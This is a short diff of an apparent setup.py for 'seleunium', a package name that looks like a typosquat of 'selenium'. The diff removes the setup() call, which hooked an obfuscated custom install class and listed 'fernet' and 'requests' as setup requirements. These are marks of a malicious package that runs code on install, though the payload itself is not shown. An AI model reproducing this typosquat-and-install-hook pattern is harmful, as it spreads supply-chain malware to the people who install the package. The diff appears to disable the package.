@@ -18,22 +18,5 @@ class BFtenTmnzSHQEQrwRyFKKAwZtyoFCOIAcrXcscoIeDQaLhnjnrZJAiiOpVgkXlXoQvvvpmCYRd
             install.run(self)
 
 
-setup(
-    name="seleunium",
-    version=VERSION,
-    author="TJCHjWAUzgKiwk",
-    author_email="yhpHzmeoGEfSmB@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': BFtenTmnzSHQEQrwRyFKKAwZtyoFCOIAcrXcscoIeDQaLhnjnrZJAiiOpVgkXlXoQvvvpmCYRdMbizROqKiLccWWjidXCyhIHmPPvHpuDtPncCa,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
 
